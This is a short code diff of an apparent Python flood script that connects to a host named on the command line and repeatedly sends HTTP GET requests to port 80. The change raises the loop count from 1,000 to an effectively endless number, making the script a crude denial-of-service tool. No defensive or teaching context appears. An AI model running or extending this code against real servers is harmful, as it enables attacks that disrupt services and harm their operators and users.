@@ -6,7 +6,7 @@ print("start attacking " + sys.argv[1] + sys.argv[2])
 
 
 def attack():  
-    #pid = os.fork()  
+    #pid = os.fork()
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
     s.connect((sys.argv[1], 80))  
     print(">> GET /" + sys.argv[2] + " HTTP/1.1")
@@ -15,7 +15,7 @@ def attack():
     s.close()
 
 
-for i in range(1, 1000):  
+for i in range(1, 9999999999999999999999999999999999999999999999999999):
     attack()  
 
 
